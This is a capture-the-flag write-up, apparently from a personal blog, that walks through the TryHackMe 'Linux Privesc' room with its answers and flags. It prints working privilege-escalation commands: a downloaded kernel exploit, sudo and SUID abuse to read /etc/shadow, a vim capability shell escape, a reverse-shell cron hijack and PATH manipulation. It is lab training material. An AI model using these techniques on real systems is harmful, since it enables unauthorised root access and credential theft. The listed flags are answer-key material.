---
date: '2022-01-22'
title: Linux Privesc
root: '/contents'
parents: ["TryHackMe"]
---

## Linux Privilege Escalation Room

## Task 3 Enumeration
```
Username and Password already provided.
ssh karen@10.10.232.44
Password: Password1
Question 1: What is the hostname of the target system? Use the command hostname.
hostname: wade7363
What is the Linux kernel version of target system? Use uname -a.
Kernel: 3.13.0-24-generic
What Linux version is it? Use lsb_release -a
Release: Ubuntu 1404 LTS
What python version is it? Use python --version to display python version.
Python: 2.7.6
What CVE is affecting this system? Go  to exploit-db and search the kernel version.
CVE-2015-1328

```

## Task 5 Kernel Exploitation
```
Username and Password already provided.
ssh karen@10.10.154.17
Password: Password1
Question1: What is the content of flag1.txt file?
Step1: Went to exploit-db and downloaded exploit 37292.c
Step2: on host started a http server with python in terminal using python -m http.server
Step3: on target machine, changed directory to /tmp then used wget http://hostIP:8000/37292.c to grab exploit from host
Step4: used gcc 37292.c -o exploit to compile and output the file named exploit
Step5: chmod +x exploit to give it executable permissions
Step6: run exploit file on target machine
Step7: use find flag1.txt then cat it to get flag file content.
flag: THM-28392872729920

```

## Task 6 SUDO
```
Username and Password already provided.
ssh karen@10.10.255.25
Password: Password1
How many programs can the user "karen" run on the target system with sudo rights?
I used sudo -l to find sudo rights under that account.
What is the content of the flag2.txt file?
We see that she can use the find command under sudo.
We then go to gtfobins.github.io to find info on the find command (pun not intended.) The first thing we find is how to get shell through sudo find. EXCELLENT.
How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?
Again, if you look up nmap on gtfobins.github.io you will find your answer under the sudo section.
What is the hash of frank's password?
We can find this by catting /etc/shadow and grepping for frank.

```

## Task 7 SUID
```
Username and Password already provided.
ssh karen@10.10.176.74
Password: Password1
Which user shares the name of a great comic book writer?
cat /etc/passwd
What is the password of user2?
Use the suid exploit to get to decode the file.
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode
What is the content of the flag3.txt file?
LFILE=flag3.txt
base64 "$LFILE" | base64 --decode
```

## Task 8 Capabilities
```
Username and Password already provided.
ssh karen@10.10.150.137
Password: Password1
How many binaries have set capabilities?
getcap -r/ 2>/dev/null to list the binaries and send the errors to null.
What other binary can be used through its capabilities?
view
What is the content of the flag4.txt file?
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

## Task 9 Cron Jobs
```
Username: karen
Password: Password1
How many user-defined cron jobs can you see on the target system?
4
What is the content of the flag5.txt file?
Lookup payloadallthethings github for bash revshell and modify the script then run nc on host.
THM-383000283
What is Matt's password?
123456
```

## Task 10 Exploiting PATH environment
```
What is the odd folder you have write access for?
do an ls -halt to view directories and their accesses.
/home/murdoch
Exploit the $PATH vulnerability to read the content of the flag6.txt file.
export PATH=/tmp:$PATH
echo "/bin/bash" > thm
chmod 777 /tmp/thm
What is the content of the flag6.txt file?
THM-736628929 
```

## Task 11 NFS
```
How many mountable shares can you identify on the target system?
cat /etc/exports
showmount -e
3
How many shares have the "no_root_squash" option enabled?
from the /etc/exports the last 3 shows the no_root_squash
What is the content of the flag7.txt file?
THM-89384012
```

## Task 12 Capstone
```
What is the content of the flag1.txt file?
find / -type f -perm -u=s 2>/dev/null
Refer to task 7 for what methodology to use.
What is the content of the flag2.txt file?
Refer to gtfobins.github.io on sudo rights for more info.

```
